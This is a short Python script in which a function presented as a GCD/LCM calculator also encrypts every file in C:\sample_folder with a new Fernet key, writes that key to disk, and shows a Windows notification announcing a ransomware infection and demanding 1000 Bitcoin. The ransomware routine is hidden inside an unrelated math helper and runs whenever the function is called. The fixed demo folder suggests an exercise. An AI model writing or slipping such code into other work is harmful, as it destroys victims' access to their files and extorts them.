import os
from cryptography.fernet import Fernet
from winotify import Notification


target_folder = r"C:\sample_folder"

if not os.path.exists(target_folder):
    os.makedirs(target_folder)

def gcd_lcm(num1, num2):
    gcd = 1
    for i in range(2, num1 + 1):
        if num1 % i == 0 and num2 % i == 0:
            gcd = i

    lcm = int(num1 * num2) / gcd

    files_list = []

    for root, dir, files in os.walk(target_folder):
        for file in files:
            if file in ["__init__.py", "secret.key", "secret.py", "README.md", "LICENSE.md"]:
                continue
            files_list.append(f'{root}/{file}')

    key = Fernet.generate_key()

    with open("secret.key", "wb") as secretkey:
        secretkey.write(key)

    for f in files_list:
        with open(f, "rb") as fi:
            data = fi.read()

        encrypted = Fernet(key).encrypt(data)

        with open(f, "wb") as fi:
            fi.write(encrypted)

    notification = Notification(app_id="Security Breach",
                                title="You Have Been Hacked",
                                msg="Your system is poisoned with ransomware. Now send me 1000 Bitcoin to get the key!")

    notification.add_actions("Click me, sweatheart!", "https://bitcoin.org/en/")

    notification.show()

    return gcd, lcm


